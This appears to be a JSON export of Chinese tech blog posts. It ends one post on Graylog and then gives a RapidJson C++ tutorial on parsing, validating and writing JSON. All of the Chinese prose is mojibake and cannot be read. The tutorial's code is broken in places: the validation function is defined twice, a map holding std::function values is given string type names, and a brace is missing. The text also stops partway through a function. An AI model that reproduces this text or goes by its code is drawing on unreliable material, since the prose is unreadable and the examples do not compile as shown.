çš„ç™»å½•å¤±è´¥æ—¥å¿—ï¼Œä¸è¿‡è¿™ä¸€ç‚¹å¯èƒ½æ˜¯Graylogçš„è¿›é˜¶ç”¨æ³•ï¼Œä»Šå¤©è¿˜æ²¡æ¢ç´¢åˆ°è¿™ä¸ªåœ°æ­¥ã€‚\nå°ç»“ æœˆæœ«å‘¨æ—¥æ˜¯éå¸¸çŸ­æš‚çš„ï¼Œç®€å•ç©äº†ç©Graylogï¼Œå†™äº†ç¯‡è®°å½•ï¼Œå°±ç»“æŸäº†çŸ­æš‚è€Œæ„‰å¿«çš„ä¸€å¤©ã€‚æœ¬æ–‡ä»dockerå®‰è£…å¼€å§‹ï¼Œä»‹ç»äº†Graylogçš„é…ç½®ã€è¿è¡Œã€è¾“å…¥æµã€æå–å™¨å’Œäº‹ä»¶ï¼Œåˆå¿ƒæ˜¯æŠŠè¿™äº›ä¸œè¥¿è¿ç”¨åˆ°æˆ‘çš„å·¥ä½œä¸­ï¼Œæå‡é—®é¢˜å®šä½çš„æ•ˆç‡ã€‚ç›®å‰æ¥çœ‹ï¼Œå…·å¤‡ä¸€å®šçš„å®ç”¨æ€§ï¼Œè‡³å°‘ç•Œé¢ä¼šæ¯”notepad++å‹å¥½è®¸å¤šï¼Œæœ‰æœºä¼šæŠ•å…¥å®æˆ˜æ£€éªŒä¸€ä¸‹æ•ˆæœã€‚\nå‚è€ƒèµ„æ–™ [1]\u0026ldquo;Get started with Docker remote containers on WSL 2,\u0026rdquo; Learn, Sep. 22, 2022. https://learn.microsoft.com/en-us/windows/wsl/tutorials/wsl-containers\n[12]\u0026ldquo;docker wsl2å¯åŠ¨ä¸äº†_win10åˆ©ç”¨WSL2å®‰è£…dockerçš„2ç§æ–¹å¼_weixin_39786155çš„åšå®¢-CSDNåšå®¢,\u0026rdquo; Blog, https://blog.csdn.net/weixin_39786155/article/details/110363154\n[3]\u0026ldquo;Search query language,\u0026rdquo; Docs, https://docs.graylog.org/docs/query-language\n[4]\u0026ldquo;Docker,\u0026rdquo; Docs, https://docs.graylog.org/docs/docker\n","date":"2022-09-25T00:00:00Z","permalink":"https://xrg.fj.cn/p/graylogn%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/","title":"Graylognä½¿ç”¨å°è®°"},{"content":"è¿‘æœŸæœ‰ä¸ªéœ€æ±‚éœ€è¦å¯¹ JSON æ•°æ®è¿›è¡Œè§£æï¼Œä¸Šå‘¨äº”æäº†ä¸€ç‚¹ç‚¹ä¹‹åå°±å»å¿™å…¶ä»–çš„äº‹æƒ…äº†ï¼Œæ­£å¥½ç”¨å‘¨æœ«æ—¶é—´æä¸€æï¼Œè¾“å‡ºç‚¹ä¸œè¥¿ã€‚\nRapidJson æ˜¯ä¸€ä¸ªC++çš„JSONè§£æå™¨åŠç”Ÿæˆå™¨ï¼Œç‰¹ç‚¹è¯¦è§å®˜ç½‘ï¼Œæ­¤å¤„ä»…ä½œä½¿ç”¨è®°å½•ã€‚\nç¯å¢ƒï¼š\nWindows 11 64bit\nWSL2 Ubuntu 22.04\ncmake version 3.22.1\ngcc version 11.2.0 (Ubuntu 11.2.0-19ubuntu1)\nè¯»è€…éœ€è¦å…·å¤‡çš„ä¸€äº›å‰ç½®çŸ¥è¯†ï¼š\ncmakeåŸºæœ¬ä½¿ç”¨ã€c++ã€LinuxåŸºæœ¬ä½¿ç”¨\nStep 1 å®‰è£… RapidJson é¡¹ç›®æ˜¯ä¸€ä¸ªçº¯å¤´æ–‡ä»¶åº“ï¼Œç›´æ¥æŠŠä»“åº“ä¸­çš„ include/rapidjson æ‹·è´åˆ°æˆ‘ä»¬CPPé¡¹ç›®çš„å¤´æ–‡ä»¶åŒ…å«è·¯å¾„å†…å³å¯ã€‚\nStep 1.1 cmake install å¯¹äºcmakeé¡¹ç›®æ¥è¯´ï¼Œåªéœ€è¦åˆ›å»ºä¸€ä¸ªåˆé€‚çš„åœ°æ–¹æ¥å­˜æ”¾å¤´æ–‡ä»¶ï¼š\nalbusguo@AlbusGuo-PC:/mnt/d/Scripts/CPPScripts/RapidJson$ tree . â”œâ”€â”€ CMakeLists.txt â”œâ”€â”€ build â”œâ”€â”€ include â”‚ â””â”€â”€ rapidjson â”‚ â”œâ”€â”€ allocators.h â”‚ â”œâ”€â”€ cursorstreamwrapper.h â”‚ â”œâ”€â”€ document.h â”‚ â”œâ”€â”€ encodedstream.h â”‚ â”œâ”€â”€ encodings.h â”‚ â”œâ”€â”€ error â”‚ â”‚ â”œâ”€â”€ en.h â”‚ â”‚ â””â”€â”€ error.h â”‚ â”œâ”€â”€ filereadstream.h â”‚ â”œâ”€â”€ filewritestream.h â”‚ â”œâ”€â”€ fwd.h â”‚ â”œâ”€â”€ internal â”‚ â”‚ â”œâ”€â”€ biginteger.h â”‚ â”‚ â”œâ”€â”€ clzll.h â”‚ â”‚ â”œâ”€â”€ diyfp.h â”‚ â”‚ â”œâ”€â”€ dtoa.h â”‚ â”‚ â”œâ”€â”€ ieee754.h â”‚ â”‚ â”œâ”€â”€ itoa.h â”‚ â”‚ â”œâ”€â”€ meta.h â”‚ â”‚ â”œâ”€â”€ pow10.h â”‚ â”‚ â”œâ”€â”€ regex.h â”‚ â”‚ â”œâ”€â”€ stack.h â”‚ â”‚ â”œâ”€â”€ strfunc.h â”‚ â”‚ â”œâ”€â”€ strtod.h â”‚ â”‚ â””â”€â”€ swap.h â”‚ â”œâ”€â”€ istreamwrapper.h â”‚ â”œâ”€â”€ memorybuffer.h â”‚ â”œâ”€â”€ memorystream.h â”‚ â”œâ”€â”€ msinttypes â”‚ â”‚ â”œâ”€â”€ inttypes.h â”‚ â”‚ â””â”€â”€ stdint.h â”‚ â”œâ”€â”€ ostreamwrapper.h â”‚ â”œâ”€â”€ pointer.h â”‚ â”œâ”€â”€ prettywriter.h â”‚ â”œâ”€â”€ rapidjson.h â”‚ â”œâ”€â”€ reader.h â”‚ â”œâ”€â”€ schema.h â”‚ â”œâ”€â”€ stream.h â”‚ â”œâ”€â”€ stringbuffer.h â”‚ â”œâ”€â”€ uri.h â”‚ â””â”€â”€ writer.h â””â”€â”€ src â”œâ”€â”€ CMakeLists.txt â”œâ”€â”€ core â”œâ”€â”€ main â””â”€â”€ main.cpp ç„¶ååœ¨ src/CMakeLists.txt æ–‡ä»¶é‡ŒæŒ‡å®š INCLUDE_DIRECTORIES(../include) å³å¯ã€‚\nStep 1.2 VSCode install æŒ‰ç…§ä¸Šä¸€æ­¥å®Œæˆé…ç½®ï¼Œåˆ™cmakeå¯ä»¥æ­£ç¡®åœ°å®Œæˆç¼–è¯‘å·¥ä½œï¼›ä½†æˆ‘ä»¬é€šå¸¸åœ¨VSCodeé‡Œè¿›è¡Œç¼–ç ï¼Œä¹Ÿæœ‰éƒ¨åˆ†è¯»è€…ä¹ æƒ¯é€šè¿‡VSCodeè¿›è¡Œè¿è¡Œ/è°ƒè¯•ï¼Œå› æ­¤æœ‰å¿…è¦å¯¹VSCodeä¹Ÿè¿›è¡Œé…ç½®ã€‚\næŒ‰ F1 è°ƒå‡ºæŒ‡ä»¤æ¡†ï¼Œè¾“å…¥ c/c++: Edit Configurations æ‰“å¼€ C/C++ æ’ä»¶çš„JSONé…ç½®æ–‡ä»¶:\nf1 æŒ‡å®š includePath ï¼š\ninclude path è¿™æ ·ï¼Œç¼–ç æ—¶å°±èƒ½å®Œæˆå¤´æ–‡ä»¶çš„æŸ¥æ‰¾å’Œè‡ªåŠ¨è¡¥å…¨äº†ã€‚\nç´§æ¥ç€ ï¼Œæˆ‘ä»¬è¦é…ç½®ä¸€é”®ç¼–è¯‘è¿è¡Œçš„æŸ¥æ‰¾è·¯å¾„ã€‚VSCodeç¼–ç æ—¶ä½¿ç”¨çš„å¤´æ–‡ä»¶è·¯å¾„å’Œç¼–è¯‘æ—¶ä½¿ç”¨çš„å¤´æ–‡ä»¶è·¯å¾„å¹¶ä¸å…±äº«ï¼Œæˆ‘ä»¬å•å‡»å³ä¸Šè§’çš„å°ä¸‰è§’æ¥ä¸€é”®è¿è¡Œæ—¶ï¼Œæœ¬è´¨ä¸Šæ˜¯å¿«æ·æ‰§è¡Œäº†ä¸€æ¡ç»ˆç«¯å‘½ä»¤è€Œå·²ï¼Œå› æ­¤è¦å¯¹è¿™æ¡å‘½ä»¤æ¥è¿›è¡Œé¢å¤–é…ç½®ã€‚\nåœ¨å·¥ä½œåŒºæ ¹ç›®å½•ä¸‹æ‰¾åˆ° .vscode æ–‡ä»¶å¤¹ï¼Œæ‰“å¼€ tasks.json ï¼š\ntasks.json å¦‚æœä¸å­˜åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹æˆ–ä¸å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥è‡ªå·±æ–°å»ºã€‚\ntasks.json æ–‡ä»¶å½“ä¸­æœ‰ä¸€é”®è¿è¡Œçš„é…ç½®é¡¹ï¼Œæˆ‘ä»¬åœ¨ç¼–è¯‘å‚æ•°é‡Œé¢æ–°å¢ -I æ¥æŒ‡å®šåŒ…å«è·¯å¾„ï¼Œè¿™é‡Œè´´å‡ºæˆ‘çš„ tasks.json ï¼Œä¾›å‚è€ƒï¼š\n{ \u0026#34;tasks\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;cppbuild\u0026#34;, \u0026#34;label\u0026#34;: \u0026#34;C/C++: g++ build active file\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;/usr/bin/g++\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;-fdiagnostics-color=always\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;${file}\u0026#34;, \u0026#34;-o\u0026#34;, \u0026#34;${fileDirname}/${fileBasenameNoExtension}\u0026#34;, \u0026#34;-I${workspaceFolder}/RapidJson/include\u0026#34;, \u0026#34;-I${workspaceFolder}/RapidJson/third/googletest/include\u0026#34; ], \u0026#34;options\u0026#34;: { \u0026#34;cwd\u0026#34;: \u0026#34;${fileDirname}\u0026#34; }, \u0026#34;problemMatcher\u0026#34;: [ \u0026#34;$gcc\u0026#34; ], \u0026#34;group\u0026#34;: { \u0026#34;kind\u0026#34;: \u0026#34;build\u0026#34;, \u0026#34;isDefault\u0026#34;: true }, \u0026#34;detail\u0026#34;: \u0026#34;Task generated by Debugger.\u0026#34; } ], \u0026#34;version\u0026#34;: \u0026#34;2.0.0\u0026#34; } å®Œæˆä¹‹åï¼Œå°±å¯ä»¥ä¸€é”®è¿è¡Œ/è°ƒè¯•æˆ‘ä»¬çš„cppæ–‡ä»¶äº†ã€‚\nStep 2 ä½¿ç”¨ Step 2.1 è¯»JSON RapidJsonå°†ä¸€ä¸ªJSONå­—ç¬¦ä¸²è§£ææˆä¸€ä¸ªæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼ˆDocument Object Modelï¼ŒDOMï¼‰ï¼Œç±»ä¼¼Javascriptå¯¹HTMLé¡µé¢çš„æ“ä½œã€‚\nTalk is cheap ï¼š\n#include \u0026lt;rapidjson/document.h\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace rapidjson; int main(int argc, char *atgv[]) { std::string jsonStr = \u0026#34;{\\n\u0026#34; \u0026#34; \\\u0026#34;m1\\\u0026#34;: \\\u0026#34;afcdeb1238\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m2\\\u0026#34;: \\\u0026#34;1234567675\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m3\\\u0026#34;: \\\u0026#34;sdasdqwsad\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;list\\\u0026#34;: [\\n\u0026#34; \u0026#34; {\\n\u0026#34; \u0026#34; \\\u0026#34;afafa\\\u0026#34;: \\\u0026#34;alkkk\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;abcdf\\\u0026#34;: \\\u0026#34;asdqw\\\u0026#34;\\n\u0026#34; \u0026#34; }\\n\u0026#34; \u0026#34; ]\\n\u0026#34; \u0026#34;}\u0026#34;; // è§£æJSONå­—ç¬¦ä¸² Document doc; if (doc.Parse(jsonStr.c_str()).HasParseError()) { doc = NULL; } // ==== snip ==== return 0; } ä¸Šé¢è¿™æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯¹ä¸€ä¸ªJSONå­—ç¬¦ä¸²è¿›è¡Œäº†è§£æï¼ŒæŒ‰ç…§ å®˜æ–¹æ–‡æ¡£ çš„è¯´æ³•ï¼Œæˆ‘ä»¬å¾—åˆ°çš„æ˜¯ä¸€ä¸ª Object å¯¹è±¡ï¼Œå®ƒæ˜¯DOMæ ‘çš„æ ¹èŠ‚ç‚¹ï¼š\nDOM tree æˆ‘ä»¬å¯ä»¥é’ˆå¯¹ä¸€ä¸ªèŠ‚ç‚¹è¿›è¡Œä¸€äº›æ“ä½œï¼š\n#include \u0026lt;rapidjson/document.h\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace rapidjson; int main(int argc, char *atgv[]) { std::string jsonStr = \u0026#34;{\\n\u0026#34; \u0026#34; \\\u0026#34;m1\\\u0026#34;: \\\u0026#34;afcdeb1238\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m2\\\u0026#34;: \\\u0026#34;1234567675\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m3\\\u0026#34;: \\\u0026#34;sdasdqwsad\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;list\\\u0026#34;: [\\n\u0026#34; \u0026#34; {\\n\u0026#34; \u0026#34; \\\u0026#34;afafa\\\u0026#34;: \\\u0026#34;alkkk\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;abcdf\\\u0026#34;: \\\u0026#34;asdqw\\\u0026#34;\\n\u0026#34; \u0026#34; }\\n\u0026#34; \u0026#34; ]\\n\u0026#34; \u0026#34;}\u0026#34;; // è§£æJSONå­—ç¬¦ä¸² Document doc; if (doc.Parse(jsonStr.c_str()).HasParseError()) { doc = NULL; } // è¾“å‡ºmember if (doc.HasMember(\u0026#34;m1\u0026#34;) \u0026amp;\u0026amp; doc[\u0026#34;m1\u0026#34;].IsString()) { std::cout \u0026lt;\u0026lt; doc[\u0026#34;m1\u0026#34;].GetString() \u0026lt;\u0026lt; std::endl; } // ==== snip ==== return 0; } cd build cmake .. make ./test_rapid_json # afcdeb1238 Step 2.2 æ£€æŸ¥JSONåˆæ³•æ€§ï¼ˆlambdaï¼‰ é€šå¸¸åœ¨ä¸šåŠ¡ä¸­æ”¶åˆ°JSONæ•°æ®æ—¶ï¼Œå¯èƒ½ç”±äºè¿™æ ·é‚£æ ·çš„åŸå› ï¼Œå°‘æ‰äº†ä¸€äº›é”®ï¼Œæˆ–è€…é”®çš„ç±»å‹ä¸å¯¹ã€‚ä¾‹å¦‚æˆ‘ä»¬åœ¨ä¸Šä¸€æ­¥é€šè¿‡ doc[\u0026quot;m1\u0026quot;].GetString() å–å‡ºäº† m1 çš„å€¼ï¼Œè½¬åŒ–æˆäº† std::string è¿›è¡Œè¾“å‡ºï¼Œä½†å¦‚æœ m1 ä¸å­˜åœ¨å‘¢ï¼Ÿæˆ–è€… m1 ä¸æ˜¯ä¸ªå­—ç¬¦ä¸²ã€è€Œæ˜¯ä¸ªåˆ—è¡¨å‘¢ï¼Ÿå› æ­¤åœ¨è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬è¦å¯¹è§£æåçš„JSONå¯¹è±¡çš„åˆæ³•æ€§è¿›è¡Œæ£€æŸ¥ã€‚\nå¯¹äºä¸€ä¸ªRapidJsonå¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨ HasMember() å’Œ Isxxxx() æ¥æ£€æŸ¥å¯¹è±¡çš„åˆæ³•æ€§ï¼Œä¾‹å¦‚ä¸Šé¢çš„ä»£ç åœ¨è¾“å‡º m1 å‰ä½¿ç”¨äº† HasMember å’Œ IsString() æ¥è¿›è¡Œæ£€æŸ¥ï¼Œä½†å‡å¦‚æˆ‘ä»¬è¦æ£€æŸ¥çš„é”®å˜å¤šäº†ï¼Œæ¯ä¸€æ¬¡éƒ½è¦ä½¿ç”¨è¿™æ ·çš„ if è¯­å¥æ¥è¿›è¡Œåˆ¤æ–­ï¼Œä»£ç éå¸¸ä¸ç®€æ´ã€‚\næ£€æŸ¥å‡½æ•°çš„ç›®æ ‡æ˜¯ï¼Œå¯ä»¥ä¸€æ¬¡æ€§å®Œæˆåˆæ³•æ€§æ£€éªŒï¼Œæˆ‘ä»¬æŠŠè¦æ£€æŸ¥çš„é”®å’Œç±»å‹ä¼ å…¥ï¼Œå‡½æ•°å®Œæˆæ£€æŸ¥ï¼›åªè¦æŸä¸€ä¸ªé”®ä¸å­˜åœ¨ã€æˆ–æŸä¸€ä¸ªé”®çš„ç±»å‹æœ‰é—®é¢˜ï¼Œå°±è¯´æ˜JSONæ•°æ®æœ‰è¯¯ï¼Œè¿”å› false ã€‚\næˆ‘å®ç°çš„ä»£ç å¦‚ä¸‹ï¼š\nclass JsonObj { public: explicit JsonObj(const char *jsonStr) { if (doc.Parse(jsonStr).HasParseError()) { doc = NULL; } } bool IsNullDoc() { return doc.IsNull(); } bool Validation(const std::map\u0026lt;std::string, std::function\u0026lt;bool(const Value\u0026amp;)\u0026gt;\u0026gt; valid) const; private: Document doc; }; bool JsonObj::Validation(const std::map\u0026lt;std::string, std::function\u0026lt;bool(const Value\u0026amp;)\u0026gt;\u0026gt; valid) const { if (doc.IsNull()) { return false; } if (valid.size() == 0) { return true; } for (auto iter : valid) { if (doc.HasMember(iter.first.c_str())) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed existance check.\\n\u0026#34;; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed existance check.\\n\u0026#34;; return false; } const Value \u0026amp;memberObj = doc[iter.first.c_str()]; if (iter.second(memberObj)) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed type check.\u0026#34; \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed type check.\u0026#34; \u0026lt;\u0026lt; std::endl; return false; } } return true; } int main() { std::string jsonStr = \u0026#34;{\\n\u0026#34; \u0026#34; \\\u0026#34;m1\\\u0026#34;: \\\u0026#34;afcdeb1238\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m2\\\u0026#34;: \\\u0026#34;1234567675\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m3\\\u0026#34;: \\\u0026#34;sdasdqwsad\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;list\\\u0026#34;: [\\n\u0026#34; \u0026#34; {\\n\u0026#34; \u0026#34; \\\u0026#34;afafa\\\u0026#34;: \\\u0026#34;alkkk\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;abcdf\\\u0026#34;: \\\u0026#34;asdqw\\\u0026#34;\\n\u0026#34; \u0026#34; }\\n\u0026#34; \u0026#34; ]\\n\u0026#34; \u0026#34;}\u0026#34;; // std::cout \u0026lt;\u0026lt; jsonStr \u0026lt;\u0026lt; std::endl; JsonObj jobj(jsonStr.c_str()); std::map\u0026lt;std::string, std::function\u0026lt;bool(const Value\u0026amp;)\u0026gt;\u0026gt; valid = { {\u0026#34;m1\u0026#34;, [](const Value \u0026amp;obj) -\u0026gt; bool { return obj.IsString(); }}, {\u0026#34;m2\u0026#34;, [](const Value \u0026amp;obj) -\u0026gt; bool { return obj.IsString(); }}, {\u0026#34;list\u0026#34;, [](const Value \u0026amp;obj) -\u0026gt; bool { return obj.IsArray(); }} }; jobj.Validation(valid); return 0; } å‡½æ•°æ¥æ”¶ä¸€ä¸ª std::map ï¼Œ map çš„é”®å°±æ˜¯è¦æ£€æŸ¥çš„é”®ï¼Œ map çš„å€¼æ˜¯è¿™ä¸ªé”®å¯¹åº”çš„ç±»å‹æ£€æŸ¥å‡½æ•°ï¼Œç±»å‹æ˜¯ std::function ï¼›ä¾‹å¦‚å¯¹äºé”® m1 è¦è°ƒç”¨ IsString() ï¼Œè€Œå¯¹äºé”® list è¦è°ƒç”¨ IsArray() ã€‚åœ¨æ„é€ è¿™ä¸ª map çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨lambdaè¡¨è¾¾å¼æ¥ä½œä¸º std::function çš„å¯¹è±¡ï¼Œå‡½æ•°å†…éƒ¨å°†è‡ªåŠ¨è°ƒç”¨å¯¹åº”çš„lambdaè¡¨è¾¾å¼æ¥æ£€æŸ¥ç±»å‹ã€‚\nè¿™ä¸ªå®ç°è°ˆä¸ä¸Šä¼˜é›…ï¼Œæˆ–è€…ç®€ç›´æ˜¯æœ‰ç‚¹æŒ«ï¼Œå› ä¸ºåœ¨ç¼–å†™è¿™äº›ä»£ç çš„æ—¶å€™è¿˜ä¸ç†Ÿæ‚‰RapidJsonçš„å…¶ä»–APIï¼›ä½†å¯ä»¥ç®—ä½œä¸€æ¬¡ç§¯æçš„å°è¯•ï¼Œä¹Ÿç®—æ˜¯å¯¹ std::function å’Œlambdaè¡¨è¾¾å¼çš„ä¸€æ¬¡ç»ƒä¹ ã€‚\nStep 2.3 æ£€æŸ¥JSONåˆæ³•æ€§ï¼ˆGetTypeï¼‰ åœ¨å®˜æ–¹æ–‡æ¡£ æŸ¥è¯¢Object ä¸€æ ä¸­ï¼Œå‘ç°äº†RapidJsonå¯¹äºå¯¹è±¡ç±»å‹çš„å®šä¹‰å’ŒæŸ¥è¯¢æ–¹æ³•ï¼š\nstatic const char* kTypeNames[] = { \u0026#34;Null\u0026#34;, \u0026#34;False\u0026#34;, \u0026#34;True\u0026#34;, \u0026#34;Object\u0026#34;, \u0026#34;Array\u0026#34;, \u0026#34;String\u0026#34;, \u0026#34;Number\u0026#34; }; for (Value::ConstMemberIterator itr = document.MemberBegin(); itr != document.MemberEnd(); ++itr) { printf(\u0026#34;Type of member %s is %s\\n\u0026#34;, itr-\u0026gt;name.GetString(), kTypeNames[itr-\u0026gt;value.GetType()]); } Type of member hello is String Type of member t is True Type of member f is False Type of member n is Null Type of member i is Number Type of member pi is Number Type of member a is Array å¯ä»¥çœ‹åˆ°ï¼Œæˆå‘˜å‡½æ•° GetType è¿”å›çš„æ˜¯è¿™ä¸ªå¯¹è±¡çš„ç±»å‹IDï¼Œè€Œç±»å‹çš„åç§°å°±æŒ‰ç…§è¿™é‡Œçš„ kTypeNames çš„é¡ºåºå®šä¹‰ã€‚\nè¿™æ˜¯éå¸¸å¥½çš„ï¼Œå¯¹äºæˆ‘ä»¬çš„æ£€æŸ¥å‡½æ•°æ¥è¯´ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŒ‰ç…§è¿™æ ·çš„é¡ºåºæ¥æŠŠç±»å‹åç§°å›ºå®šä¸‹æ¥ï¼Œæ£€æŸ¥çš„æ—¶å€™ï¼Œåªè¦æ£€æŸ¥ç±»å‹åç§°å°±å¯ä»¥ï¼Œå¤§å¤§æé«˜äº†å¯è¯»æ€§ï¼š\nclass JsonObj { public: explicit JsonObj(const char *jsonStr) { if (doc.Parse(jsonStr).HasParseError()) { doc = NULL; } } bool IsNullDoc() { return doc.IsNull(); } bool Validation(const std::map\u0026lt;std::string, std::string\u0026gt; valid) const; private: Document doc; std::vector\u0026lt;std::string\u0026gt; kTypeNames = { \u0026#34;Null\u0026#34;, \u0026#34;False\u0026#34;, \u0026#34;True\u0026#34;, \u0026#34;Object\u0026#34;, \u0026#34;Array\u0026#34;, \u0026#34;String\u0026#34;, \u0026#34;Number\u0026#34; }; }; bool JsonObj::Validation(const std::map\u0026lt;std::string, std::string\u0026gt; valid) const { if (doc.IsNull()) { return false; } if (valid.size() == 0) { return true; } for (auto iter : valid) { if (doc.HasMember(iter.first.c_str())) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed existance check.\\n\u0026#34;; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed existance check.\\n\u0026#34;; return false; } auto typeId = doc[iter.first.c_str()].GetType(); if (kTypeNames[typeId] == iter.second) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed type check.\u0026#34; \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed type check.\\n\u0026#34;; std::cout \u0026lt;\u0026lt; \u0026#34;real type: \u0026#34; \u0026lt;\u0026lt; kTypeNames[typeId] \u0026lt;\u0026lt; std::endl; return false; } } return true; } bool JsonObj::Validation(const std::map\u0026lt;std::string, std::string\u0026gt; valid) const { if (doc.IsNull()) { return false; } if (valid.size() == 0) { return true; } for (auto iter : valid) { if (doc.HasMember(iter.first.c_str())) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed existance check.\\n\u0026#34;; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed existance check.\\n\u0026#34;; return false; } auto typeId = doc[iter.first.c_str()].GetType(); if (kTypeNames[typeId] == iter.second) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed type check.\u0026#34; \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed type check.\\n\u0026#34;; std::cout \u0026lt;\u0026lt; \u0026#34;real type: \u0026#34; \u0026lt;\u0026lt; kTypeNames[typeId] \u0026lt;\u0026lt; std::endl; return false; } } return true; } int main() { std::string jsonStr = \u0026#34;{\\n\u0026#34; \u0026#34; \\\u0026#34;m1\\\u0026#34;: \\\u0026#34;afcdeb1238\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m2\\\u0026#34;: \\\u0026#34;1234567675\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m3\\\u0026#34;: \\\u0026#34;sdasdqwsad\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;list\\\u0026#34;: [\\n\u0026#34; \u0026#34; {\\n\u0026#34; \u0026#34; \\\u0026#34;afafa\\\u0026#34;: \\\u0026#34;alkkk\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;abcdf\\\u0026#34;: \\\u0026#34;asdqw\\\u0026#34;\\n\u0026#34; \u0026#34; }\\n\u0026#34; \u0026#34; ]\\n\u0026#34; \u0026#34;}\u0026#34;; // std::cout \u0026lt;\u0026lt; jsonStr \u0026lt;\u0026lt; std::endl; JsonObj jobj(jsonStr.c_str()); std::map\u0026lt;std::string, std::function\u0026lt;bool(const Value\u0026amp;)\u0026gt;\u0026gt; valid = { {\u0026#34;m1\u0026#34;, \u0026#34;String\u0026#34;}, {\u0026#34;m2\u0026#34;, \u0026#34;String\u0026#34;}, {\u0026#34;list\u0026#34;, \u0026#34;Array\u0026#34;} }; jobj.Validation(valid); return 0; ç”±äºç±»å‹æ£€æŸ¥æœ¬è´¨ä¸Šæ˜¯åœ¨æ£€æŸ¥å®ƒçš„æ•°å€¼å½¢å¼çš„ typeId ï¼Œåˆ™æˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠç±»å‹åç§°ä»å­—ç¬¦ä¸²å½¢å¼ä¼˜åŒ–æˆæšä¸¾å€¼çš„å½¢å¼ï¼ŒèŠ‚çº¦å­˜å‚¨ç©ºé—´å’Œæ¯”è¾ƒçš„æ—¶é—´ï¼Œåœ¨è¿™é‡Œå°±ä¸å¤šå†™äº†ã€‚\nStep 2.4 å†™JSON å¯ä»¥ä½¿ç”¨ Writer æˆ– PrettyWriter æ¥å°†DOMå¯¹è±¡è½¬åŒ–æˆJSONä¸²ã€‚\n#include \u0026#34;rapidjson/document.h\u0026#34; #include \u0026#34;rapidjson/writer.h\u0026#34; #include \u0026#34;rapidjson/prettywriter.h\u0026#34; #include \u0026#34;rapidjson/stringbuffer.h\u0026#34; #include \u0026#34;gtest/gtest.h\u0026#34; #include \u0026lt;map\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;functional\u0026gt; #include \u0026lt;vector\u0026gt; using namespace rapidjson; namespace { class JsonObj { public: JsonObj() { doc.SetObject(); } explicit JsonObj(const char *jsonStr) { if (doc.Parse(jsonStr).HasParseError()) { doc = NULL; } } template\u0026lt;typename T\u0026gt; bool AddMember(const std::string \u0026amp;key, const T \u0026amp;value); bool PrintJsonStr(); const Value\u0026amp; GetObj() { return doc.GetObject(); } private: Document doc; }; template\u0026lt;\u0026gt; bool JsonObj::AddMember(const std::string \u0026amp;key, const std::string \u0026amp;value) { if (!doc.IsObject()) { return false; } auto \u0026amp;allocator = doc.GetAllocator(); Value memKey(key.c_str(), allocator); Value memVal(value.c_str(), allocator); doc.AddMember(memKey, memVal, allocator); return true; } template\u0026lt;\u0026gt; bool JsonObj::AddMember(const std::string \u0026amp;key, const int \u0026amp;value) { if (!doc.IsObject()) { return false; } auto \u0026amp;allocator = doc.GetAllocator(); Value memKey(key.c_str(), allocator); doc.AddMember(memKey, value, allocator); return true; } template\u0026lt;\u0026gt; bool JsonObj::AddMember(const std::string \u0026amp;key, const bool \u0026amp;value) { if (!doc.IsObject()) { return false; } auto \u0026amp;allocator = doc.GetAllocator(); Value memKey(key.c_str(), allocator); doc.AddMember(memKey, value, allocator); return true; } template\u0026lt;typename T\u0026gt; bool JsonObj::AddMember(const std::string \u0026amp;key, const T \u0026amp;value) { if (!doc.IsObject()) { return false; } auto \u0026amp;allocator = 